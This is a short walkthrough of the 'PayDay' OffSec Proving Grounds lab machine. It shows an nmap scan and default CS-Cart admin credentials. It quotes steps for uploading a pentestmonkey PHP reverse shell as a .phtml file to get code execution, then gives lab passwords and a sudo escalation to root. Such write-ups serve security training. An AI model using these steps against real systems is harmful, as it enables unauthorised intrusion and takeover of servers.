# PayDay

## Info

PayDay is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
22/tcp    open     ssh            syn-ack ttl 61 OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp    open     http           syn-ack ttl 61 Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
110/tcp   open     pop3           syn-ack ttl 61 Dovecot pop3d
139/tcp   open     netbios-ssn    syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp   open     imap           syn-ack ttl 61 Dovecot imapd
445/tcp   open     netbios-ssn    syn-ack ttl 61 Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp   open     ssl/imap       syn-ack ttl 61 Dovecot imapd
995/tcp   open     ssl/pop3       syn-ack ttl 61 Dovecot pop3d
```

## HTTP 80

The following credentials allow access to CS-cart.

```
admin:admin
```

After researching the docs, the following url returns the version number.

```
http://<ip>/index.php?version
```

The version 1.3.3 is vulnerable to RCE with instructions in searchsploit.

```
get PHP shells from
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
edit IP && PORT
Upload to file manager
change the extension from .php to .phtml
visit http://[victim]/skins/shell.phtml --> Profit. ...!
```

## User

After visiting the admin panel with the following url.

```
http://<ip>/admin.php
```

The following admin credentials allow authentication.

```
admin:admin
```

Browse to the 'look and feel' section and select template editor, this allows upload of the .phtml shell.

## Root

There is a capture file in the root directory with the following credentials.

```
brett:ilovesecuritytoo
```

These credentials do not work anywhere, as the user has a habit of setting the password the same as the username, the following works for patrick.

```
patrick:patrick
```

patrick allows all commands as sudo.

```
sudo su root
```
